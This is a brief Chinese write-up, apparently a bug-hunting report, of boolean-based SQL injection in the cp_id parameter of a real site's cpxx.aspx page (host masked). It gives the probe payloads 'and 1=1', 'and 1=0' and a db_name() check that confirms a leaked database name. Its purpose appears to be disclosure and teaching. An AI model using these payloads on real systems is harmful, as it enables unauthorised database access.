---
title: edu下的SQL
slug: "0019"
---
# **edu下的SQL**

**URL：http://XXX.net/WebModel/Model1/cpxx.aspx?cp_id=21280**

**几处接口存在数据库名敏感信息泄露 为后续sql注入语句payload起到铺垫作用**

**点击企业新闻和供求信息**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970835046-74c899e6-f73e-4f08-87db-9272834044e1.png)**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970834896-103b900b-491e-4cdd-9ff8-cda4c316e4da.png)**

**数据库名为 'YanMo'**

**回到目标网站**

**cpxx.aspx?cp_id=21280 + - * / and 都可以判断存在sql注入点**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970837732-a33140b9-689c-4323-bdda-186c727e2dba.png)**

**利用and构造sql注入语句**

**and 1=1 正常回显**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970837814-c58d251d-9e28-4e02-bba5-907b8635226a.png)**

**and 1=0 错误回显**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970836687-f29e5272-973b-4a48-976e-545643769fa8.png)**

**利用之前获得的数据库名 构造payload 页面正常回显**

**从而再次判断数据库名为'YanMo'**

**cpxx.aspx?cp_id=21280 and db_name()='YanMo'**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970839592-4bee6916-3b48-441c-a7ed-088f6cf56204.png)**

**第二个接口**

**http://XXX/cpxx.aspx?cp_id=10832**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970839614-eaf20e17-3d18-44d2-9c0c-2ec06f592a96.png)**

**payload一致**

**cpxx.aspx?cp_id=10832 and db_name()='YanMo'**

**![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970839971-63bbf7ae-13f5-4de6-bc90-189a61c93921.png)**
